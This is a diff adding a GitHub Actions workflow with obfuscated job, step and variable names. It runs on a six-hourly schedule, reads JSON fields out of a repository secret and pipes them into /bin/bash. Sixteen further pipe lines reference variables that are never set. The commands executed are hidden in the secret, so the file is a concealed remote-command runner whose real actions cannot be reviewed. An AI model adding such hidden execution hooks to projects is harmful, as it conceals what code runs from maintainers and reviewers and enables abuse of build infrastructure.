@@ -1,0 +1,34 @@
+name: langzhengdong5678
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: langzhengdong5678
+        env:
+          tkoah240: ${{ secrets.tkoah240 }}
+        run: |
+          echo $tkoah240 | jq -r .uo111 | /bin/bash
+          echo $h130 | jq -r .bool95 | /bin/bash
+          echo $zjm497 | jq -r .z48703 | /bin/bash
+          echo $fn960 | jq -r .mqyt8772 | /bin/bash
+          echo $dmbq41 | jq -r .s7 | /bin/bash
+          echo $kfcz36 | jq -r .gzq5 | /bin/bash
+          echo $ann0 | jq -r .c4354 | /bin/bash
+          echo $yt9924 | jq -r .mvlhy748 | /bin/bash
+          echo $xtl53224 | jq -r .z440 | /bin/bash
+          echo $ak51322 | jq -r .r07 | /bin/bash
+          echo $sayjc047 | jq -r .ghkd6 | /bin/bash
+          echo $nvwu3 | jq -r .eabhs7332 | /bin/bash
+          echo $uiaxv43 | jq -r .k7572 | /bin/bash
+          echo $bslkn77 | jq -r .q46 | /bin/bash
+          echo $l37 | jq -r .lgd9739 | /bin/bash
+          echo $kjf84 | jq -r .rxp228 | /bin/bash
+          echo $eur37 | jq -r .o401 | /bin/bash
+
